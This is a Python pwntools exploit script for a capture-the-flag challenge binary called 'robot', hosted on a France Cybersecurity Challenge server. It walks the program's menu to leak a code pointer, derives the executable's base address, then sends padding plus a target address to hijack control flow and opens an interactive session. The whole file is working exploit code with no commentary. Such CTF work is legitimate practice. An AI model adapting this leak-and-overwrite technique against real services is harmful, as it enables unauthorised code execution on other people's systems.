#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'


# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./robot')


host, port = "challenges.france-cybersecurity-challenge.fr", "2101"

p = remote(host,port)

sla('Quitter\n', '1')
sla('> ', 'a')
sla('Quitter\n', '3')
sla('Quitter\n', '4')
sla('> ', 'a')
sla('Quitter\n', '5')

buff = p.recv()
buff = b''
for i in range(32):
  buff += p.recv(1)
print(hexdump(buff))
leak = u64(buff[16:24])

logleak('leak' , leak)
exe.address = leak - exe.sym['bleep']


sla('Quitter\n', '1')
sla('> ', 'a')
sla('Quitter\n', '3')

sla('Quitter\n', '4')
sla('> ', b'A'*16+p64(exe.address+0x147c))

sla('Quitter\n', '2')

p.interactive()

